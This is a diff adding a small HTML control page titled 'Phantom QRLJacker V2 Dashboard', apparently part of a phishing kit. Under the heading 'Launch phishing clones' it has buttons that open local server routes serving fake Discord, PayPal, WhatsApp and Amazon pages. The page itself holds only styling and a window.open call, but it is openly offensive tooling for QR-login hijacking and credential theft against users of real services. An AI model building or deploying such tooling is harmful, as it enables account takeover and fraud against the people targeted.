@@ -1,0 +1,24 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+<title>Phantom Dashboard</title>
+<style>
+body { font-family: sans-serif; background: #111; color: #0f0; padding: 20px; }
+button { margin: 10px; padding: 10px; font-size: 16px; }
+</style>
+<script>
+function deploy(target) {
+    window.open("http://127.0.0.1:5000/" + target, "_blank");
+}
+</script>
+</head>
+<body>
+<h1>🧿 Phantom QRLJacker V2 Dashboard</h1>
+<p>Launch phishing clones:</p>
+<button onclick="deploy('discord')">Launch Discord</button>
+<button onclick="deploy('paypal')">Launch PayPal</button>
+<button onclick="deploy('whatsapp')">Launch WhatsApp</button>
+<button onclick="deploy('amazon')">Launch Amazon</button>
+</body>
+</html>
